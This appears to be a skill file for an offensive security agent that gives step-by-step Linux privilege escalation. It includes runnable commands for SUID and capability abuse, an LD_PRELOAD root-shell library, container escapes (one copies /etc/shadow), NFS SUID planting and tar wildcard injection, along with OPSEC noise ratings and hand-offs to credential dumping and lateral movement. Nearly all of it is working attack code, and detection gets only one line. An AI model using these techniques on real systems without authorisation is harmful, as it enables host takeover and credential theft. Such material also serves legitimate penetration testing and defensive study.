# Linux Privilege Escalation

tags: linux, privilege-escalation, suid, capabilities, sudo, kernel, docker, container-escape, nfs, wildcard, ld-preload

## Objective
Escalate from unprivileged shell to root on a Linux host using identified misconfigurations or kernel exploits.

## Prerequisites
- Shell access on Linux target
- Enumeration data from Linux Enumeration skill

## Methodology

### SUID Abuse
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Example: python3 with SUID
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Cross-reference all findings with GTFOBins: https://gtfobins.github.io/
```

### Capabilities Abuse
```bash
# cap_setuid on interpreter = root
# Example: python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search = read any file (shadow, SSH keys)
# cap_sys_admin = container escape potential
```

### Sudo LD_PRELOAD
If `env_keep+=LD_PRELOAD` in sudo config:
```c
// Compile: gcc -fPIC -shared -o evil.so evil.c -nostartfiles
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    system("/bin/bash -p");
}
```
```bash
sudo LD_PRELOAD=/tmp/evil.so <any_allowed_command>
```

### Kernel Exploits
```bash
# Check kernel version
uname -r

# Automated suggestion
./linux-exploit-suggester-2.pl

# Key exploits:
# DirtyPipe (CVE-2022-0847) — Linux 5.8–5.16.11
# DirtyCow (CVE-2016-5195) — Linux <4.8.3
# PwnKit (CVE-2021-4034) — pkexec, most distros
```

### Docker/Container Escape
```bash
# Detect container
ls /.dockerenv

# Mounted Docker socket escape
docker run -v /:/host --privileged -it ubuntu chroot /host bash

# Privileged container — cgroup release_agent escape
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
echo "#!/bin/bash\ncat /etc/shadow > /tmp/cgrp/output" > /cmd
echo "/cmd" > /tmp/cgrp/release_agent
echo $$ > /tmp/cgrp/cgroup.procs

# Or simpler: nsenter
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### NFS no_root_squash
```bash
# Check for NFS exports with no_root_squash
showmount -e target

# Mount share, create SUID binary, execute on target
mount -t nfs target:/share /mnt
cp /bin/bash /mnt/bash && chmod +s /mnt/bash
# On target: /share/bash -p
```

### Wildcard Injection (Cron with tar)
```bash
# If cron runs: tar czf backup.tar.gz *
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > shell.sh
# Wait for cron → /tmp/rootbash -p
```

## Graph Reporting
- **ADMIN_TO edges**: from user → host (root access confirmed)
- **Credential nodes**: from /etc/shadow, SSH keys, config files
- **Host node enrichment**: root access method, kernel version
- Update objective progress if root achieved

## OPSEC Notes

| Technique | Noise Rating |
|-----------|-------------|
| SUID/capability abuse | 0.2 |
| Sudo abuse | 0.2 |
| Kernel exploit | 0.5 |
| Docker escape | 0.4 |
| NFS abuse | 0.3 |
| Wildcard injection | 0.2 |

**Detection**: Sysmon for Linux, auditd rules for setuid/setgid calls, process monitoring for unusual root shells, file integrity monitoring.

## Sequencing
- **After**: Linux Enumeration (identified escalation vectors)
- **Feeds →**: Credential Dumping (with root access), Pivoting (if new network access), Lateral Movement
